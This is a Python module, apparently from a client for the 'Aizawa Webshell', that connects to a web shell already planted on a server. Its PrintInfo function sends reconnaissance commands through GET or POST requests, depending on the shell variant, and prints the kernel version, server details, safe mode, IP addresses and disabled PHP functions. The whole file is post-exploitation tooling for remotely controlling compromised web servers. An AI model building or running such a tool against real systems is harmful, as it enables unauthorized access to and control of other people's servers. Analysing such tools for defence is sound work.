from modules.colors import BOLD, GREEN, CLEAR
from modules.executor import Executor

"""
    Asynchronously prints information based on the provided type, client, and URL.

    Args:
        type (str): The type of information to be printed.
        client: The client object used to make requests.
        url (str): The URL to make requests to.

    Returns:
        Returns a print statement with the information.
"""
async def PrintInfo(type, client, url):
    if type in [
        "http_aizawa_ninja_concat",
        "http_aizawa_ninja_debug",
        "http_aizawa_ninja_gc",
        "http_aizawa_ninja_json",
        "http_aizawa_ninja_filter",
        "http_aizawa_ninja_eval",
    ]:
        print(f"{BOLD}{GREEN}Successfully connected to Aizawa Webshell Ninja Edition!{CLEAR}")
    else:
        print(f"{BOLD}{GREEN}Successfully connected to Aizawa Webshell!{CLEAR}\n")

        info_commands = {
            "Kernel": "unamea",
            "Server": "server",
            "Safe Mode": "safe_mode",
            "Server IP": "server_ip",
            "Client IP": "client_ip",
            "Disable Function": "disable_functions",
        }

        if type in ["http_accept_language_post", "http_user_agent_post"]:
            method = "post"
        elif type in ["http_accept_language_get", "http_user_agent_get"]:
            method = "get"

        max_label_width = max(len(label) for label in info_commands.keys())

        for info, command in info_commands.items():
            if method == "get":
                result = await Executor.execute(client, url, f"?{command}", method)
            elif method == "post":
                result = await Executor.execute(client, url, f"{command}", method)
            formatted_info = f"{info.ljust(max_label_width)} : {result}"
            print(f"{BOLD}{formatted_info}{CLEAR}")